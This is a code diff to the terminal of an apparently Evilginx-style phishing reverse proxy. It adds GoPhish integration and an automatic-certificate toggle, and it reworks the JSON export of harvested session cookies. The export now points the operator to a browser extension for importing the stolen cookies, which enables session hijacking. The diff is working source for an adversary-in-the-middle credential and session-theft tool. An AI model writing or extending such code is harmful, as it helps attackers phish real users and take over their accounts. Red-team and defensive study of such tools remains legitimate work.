@@ -182,8 +182,18 @@ func (t *Terminal) DoWork() {
 func (t *Terminal) handleConfig(args []string) error {
 	pn := len(args)
 	if pn == 0 {
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl}
+		autocertOnOff := "off"
+		if t.cfg.IsAutocertEnabled() {
+			autocertOnOff = "on"
+		}
+
+		gophishInsecure := "false"
+		if t.cfg.GetGoPhishInsecureTLS() {
+			gophishInsecure = "true"
+		}
+
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -205,6 +215,29 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetUnauthUrl(args[1])
 			return nil
+		case "autocert":
+			switch args[1] {
+			case "on":
+				t.cfg.EnableAutocert(true)
+				t.manageCertificates(true)
+				return nil
+			case "off":
+				t.cfg.EnableAutocert(false)
+				t.manageCertificates(true)
+				return nil
+			}
+		case "gophish":
+			switch args[1] {
+			case "test":
+				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
+				err := t.p.gophish.Test()
+				if err != nil {
+					log.Error("gophish: %s", err)
+				} else {
+					log.Success("gophish: connection successful")
+				}
+				return nil
+			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -216,6 +249,24 @@ func (t *Terminal) handleConfig(args []string) error {
 			case "bind":
 				t.cfg.SetServerBindIP(args[2])
 				return nil
+			}
+		case "gophish":
+			switch args[1] {
+			case "admin_url":
+				t.cfg.SetGoPhishAdminUrl(args[2])
+				return nil
+			case "api_key":
+				t.cfg.SetGoPhishApiKey(args[2])
+				return nil
+			case "insecure":
+				switch args[2] {
+				case "true":
+					t.cfg.SetGoPhishInsecureTLS(true)
+					return nil
+				case "false":
+					t.cfg.SetGoPhishInsecureTLS(false)
+					return nil
+				}
 			}
 		}
 	}
@@ -383,7 +434,7 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
+				_, err := t.cfg.GetPhishlet(s.Phishlet)
 				if err != nil {
 					log.Error("%v", err)
 					break
@@ -430,8 +481,9 @@ func (t *Terminal) handleSessions(args []string) error {
 						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
 					}
 					if len(s.CookieTokens) > 0 {
-						json_tokens := t.cookieTokensToJSON(pl, s.CookieTokens)
+						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
+						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
 					}
 				}
 				break
@@ -1109,13 +1161,19 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("wildcards")))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
+	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
+	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
+	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
+	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
+	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1198,16 +1256,17 @@ func (t *Terminal) createHelp() {
 	t.hlp = h
 }
 
-func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
+func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
 		ExpirationDate int64  `json:"expirationDate"`
 		Value          string `json:"value"`
 		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
-		Secure         bool   `json:"secure,omitempty"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
 	}
 
 	var cookies []*Cookie
@@ -1221,13 +1280,16 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 				Secure:         false,
+				Session:        false,
 			}
 			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
 				c.Secure = true
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
-				c.Domain = domain[1:]
+				// c.Domain = domain[1:] - bug support no longer needed
+				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
+				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
 			} else {
 				c.HostOnly = true
 			}
@@ -1242,7 +1304,7 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 	return string(json)
 }
 
-func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
+func (t *Terminal) tokensToJSON(tokens map[string]string) string {
 	var ret string
 	white := color.New(color.FgHiWhite)
 	for k, v := range tokens {
@@ -1262,21 +1324,30 @@ func (t *Terminal) checkStatus() {
 
 func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
-		hosts := t.p.cfg.GetActiveHostnames("")
-		//wc_host := t.p.cfg.GetWildcardHostname()
-		//hosts := []string{wc_host}
-		//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
-		if verbose {
-			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
-		}
-		err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
-		if err != nil {
-			log.Error("failed to set up TLS certificates: %s", err)
-			log.Error("run 'test-certs' command to retry")
-			return
-		}
-		if verbose {
-			log.Info("successfully set up all TLS certificates")
+		if t.cfg.IsAutocertEnabled() {
+			hosts := t.p.cfg.GetActiveHostnames("")
+			//wc_host := t.p.cfg.GetWildcardHostname()
+			//hosts := []string{wc_host}
+			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
+			if verbose {
+				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
+			}
+			err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
+			if err != nil {
+				log.Error("failed to set up TLS certificates: %s", err)
+				log.Error("run 'test-certs' command to retry")
+				return
+			}
+			if verbose {
+				log.Info("successfully set up all TLS certificates")
+			}
+		} else {
+			err := t.p.crt_db.setUnmanagedSync(verbose)
+			if err != nil {
+				log.Error("failed to set up TLS certificates: %s", err)
+				log.Error("run 'test-certs' command to retry")
+				return
+			}
 		}
 	}
 }
